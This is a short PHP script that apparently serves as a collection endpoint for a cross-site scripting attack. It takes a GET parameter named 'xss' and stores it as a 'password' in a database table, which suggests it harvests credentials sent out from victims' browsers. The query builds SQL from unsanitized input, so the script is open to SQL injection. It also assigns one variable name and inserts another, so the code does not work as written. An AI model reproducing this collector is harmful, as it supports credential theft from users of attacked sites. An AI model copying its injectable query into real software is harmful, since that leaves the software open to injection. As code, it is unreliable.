<?php

include_once 'mysqlDB.php';

$_xss = $_GET['xss'];

$conn= new mysqlDB;
$conn->connect();

$conn->query("INSERT INTO `xss`(`password`) VALUES ('$xss')");
$conn->disConnect();

echo "here";

?>
